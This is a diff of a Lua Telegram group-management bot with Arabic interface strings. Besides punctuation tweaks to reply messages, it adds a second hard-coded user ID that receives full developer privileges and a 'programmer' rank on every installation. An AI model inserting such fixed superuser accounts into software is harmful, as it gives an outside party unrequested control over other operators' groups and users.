@@ -173,7 +173,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1264922434,}   
+sudo_users = {SUDO,1264922434,1216110209}   
 function SudoBot(msg)  
 local BOYKA = false  
 for k,v in pairs(sudo_users) do  
@@ -234,6 +234,8 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1264922434) then  
 var = true  
+elseif tonumber(user_id) == tonumber(1216110209) then
+var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
@@ -260,6 +262,8 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1264922434) then  
 var = 'مطور السورس'
+elseif tonumber(user_id) == tonumber(1216110209) then
+var = 'مبرمج بويكا'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
@@ -7024,7 +7028,7 @@ end
 if text == "الرابط" then 
 local status_Link = database:get(bot_id.."Link_Group:status"..msg.chat_id_)
 if not status_Link then
-send(msg.chat_id_, msg.id_," ✸∫ الرابط معطل") 
+send(msg.chat_id_, msg.id_," ✸ الرابط معطل") 
 return false  
 end
 local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
@@ -7036,7 +7040,7 @@ if linkgpp.ok == true then
 database:set(bot_id.."Private:Group:Link"..msg.chat_id_,linkgpp.result)
 linkgp = '𝒍𝒊𝒏𝒌 𝒈𝒓𝒐𝒖𝒑  ??\n≪━━━━━━━━━━━━━≫\n ['..linkgpp.result..']'
 else
-linkgp = ' ✸∫ لا يوجد رابط ارسل ضع رابط'
+linkgp = ' ✸ لا يوجد رابط ارسل ضع رابط'
 end  
 send(msg.chat_id_, msg.id_,linkgp)              
 end            
@@ -7820,7 +7824,7 @@ end
 return false
 end
 if num > 100 then 
-send(msg.chat_id_, msg.id_,' ✸∫ تستطيع التنظيف ل100 رساله كحد اقصى')
+send(msg.chat_id_, msg.id_,' ✸∫ تستطيع التنظيف 100 رساله كحد اقصى') 
 return false  
 end  
 local msgm = msg.id_
